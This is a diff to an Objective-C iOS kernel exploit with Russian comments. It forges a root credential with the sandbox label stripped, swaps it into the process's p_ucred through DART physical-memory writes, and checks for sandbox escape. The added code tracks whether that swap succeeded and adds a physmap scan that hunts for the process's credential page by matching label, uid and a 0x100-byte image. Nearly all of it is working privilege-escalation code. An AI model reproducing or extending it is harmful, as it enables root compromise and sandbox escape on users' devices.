@@ -8079,6 +8079,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 // Форж = копия ucred на НАШЕЙ странице (uid/gid=0, label=NULL);
                 // p_ucred переписываем physmap-алиасом одним DART physwrite8.
                 // Никаких правок таблиц, TLB-игр и deadly-чтений.
+                BOOL pswapRoot = NO;
                 {
                     uint64_t ucFieldVA = roF + koffsetof(proc_ro, ucred);
                     uint64_t lvlP = 3, ltP = 0;
@@ -8116,6 +8117,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                     kpNote(r, [NSString stringWithFormat:@"  [PSWAP] sandbox-проба (запись в /var/mobile): %@",
                                               fpf ? @"УСПЕХ — label снят, песочницы нет" : @"ОТКАЗ"]);
                                     if (fpf) { fputs("root via p_ucred swap\n", fpf); fclose(fpf); }
+                                    pswapRoot = YES;
                                 }
                                 usleep(1000000);   // секунда root-состояния на пробы
                                 kpPhysWrite8v2(svc, tsdV, ttM, isTable, ucFieldPA & ~0x3fffULL,
@@ -8150,6 +8152,51 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                     kpPhysWrite8v2(svc, tsdV, ttM, isTable, l3tPA, (uint32_t)freeI * 8, 0, r);   // restore
                             }
                         }
+                    }
+                }
+                // 1.9.279 (р.72): таблицы ucred/proc_ro системно deadly (276/278),
+                // табличные DMA-записи fenced (277/278) → ucredPA берём ФИЗМАП-СКАНОМ,
+                // без таблиц вообще. ucred лежит в физстранице на том же uoff; physmap
+                // CPU-читаемо (ctlPA-валидации). Фильтр кандидатов: тип фрейма = тип
+                // страницы нашего proc (zone-data, её PA walker отдаёт каждый бут).
+                // Сигнатура: cr_label(raw)@+0x78 + uid@+0x18 → сверка 0x100 байт.
+                if (!pagePA && !pswapRoot && ucF && selfProcM && gFrameTableVA) {
+                    uint32_t uoff2 = (uint32_t)(ucF & 0x3fff);
+                    uint64_t labelQ = early_kread64(ucF + 0x78);
+                    uint32_t uid32 = (uint32_t)early_kread64(ucF + 0x18);
+                    uint8_t ucImg[0x100];
+                    for (uint32_t i = 0; i < 0x100; i += 8) *(uint64_t *)(ucImg + i) = early_kread64(ucF + i);
+                    uint64_t lvlC = 3, ltC = 0;
+                    uint64_t gpaC = vtophys_lvl(kconstant(cpuTTEP), kp_untag_ptr(selfProcM), &lvlC, &ltC);
+                    int tProc = gpaC ? kpFrameTypeOf(gpaC & ~0x3fffULL) : -1;
+                    uint64_t nF = kconstant(physSize) >> 14;
+                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z] старт: uoff=%#x label=%#llx uid=%u tProc=0x%x frames=%#llx",
+                              uoff2, (unsigned long long)labelQ, uid32, tProc, (unsigned long long)nF]);
+                    if (uoff2 + 0x100 <= 0x4000 && tProc >= 0) {
+                        uint64_t cands = 0;
+                        uint64_t idx = 0;
+                        for (; idx < nF && !pagePA; idx++) {
+                            uint64_t pa = kconstant(physBase) + (idx << 14);
+                            int t = kpFrameTypeOf(pa);
+                            if ((idx & 0xFFFF) == 0)
+                                kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z] прогресс: %#llx/%#llx, кандидатов %llu",
+                                          (unsigned long long)idx, (unsigned long long)nF, (unsigned long long)cands]);
+                            if (t != tProc) continue;
+                            cands++;
+                            uint64_t pkva2 = phystokv(pa);
+                            if (!pkva2) continue;
+                            if (early_kread64(pkva2 + uoff2 + 0x78) != labelQ) continue;
+                            if ((uint32_t)early_kread64(pkva2 + uoff2 + 0x18) != uid32) continue;
+                            BOOL full = YES;
+                            for (uint32_t i = 0; i < 0x100; i += 8)
+                                if (early_kread64(pkva2 + i) != *(uint64_t *)(ucImg + i)) { full = NO; break; }
+                            kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z] кандидат pa=%#llx: label+uid сошлись, сверка 0x100 — %@",
+                                      (unsigned long long)pa, full ? @"СОШЛАСЬ ★" : @"мимо"]);
+                            if (full) pagePA = pa;
+                        }
+                        kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z] финиш: кадров=%#llx кандидатов=%llu pagePA=%#llx — %@",
+                                  (unsigned long long)idx, (unsigned long long)cands, (unsigned long long)pagePA,
+                                  pagePA ? @"ucredPA НАЙДЕН ★" : @"мимо (тип не тот — понадобится гистограмма)"]);
                     }
                 }
                 // ДВЕ валидации PA перед любой записью: (1) phystokv(pagePA) читается
